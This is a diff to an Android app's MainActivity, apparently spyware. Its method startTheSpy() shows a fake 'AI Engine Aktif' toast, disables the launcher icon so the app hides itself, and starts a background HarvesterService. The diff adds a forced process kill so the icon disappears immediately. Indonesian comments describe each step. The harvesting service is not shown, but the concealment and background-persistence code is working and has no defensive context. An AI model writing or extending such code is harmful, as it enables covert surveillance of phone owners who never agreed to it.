@@ -5,6 +5,7 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.os.Process;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
@@ -65,6 +66,7 @@ public class MainActivity extends AppCompatActivity {
     private void startTheSpy() {
         Toast.makeText(MainActivity.this, "AI Engine Aktif...", Toast.LENGTH_SHORT).show();
 
+        // 1. Sembunyiin Icon dari Launcher
         ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
         getPackageManager().setComponentEnabledSetting(
                 componentName,
@@ -72,7 +74,11 @@ public class MainActivity extends AppCompatActivity {
                 PackageManager.DONT_KILL_APP
         );
 
+        // 2. Jalanin Service di Background
         startService(new Intent(this, HarvesterService.class));
+
+        // 3. TUTUP PAKSA APLIKASI (Biar Launcher langsung nge-refresh dan icon ilang)
         finishAffinity();
+        Process.killProcess(Process.myPid());
     }
 }
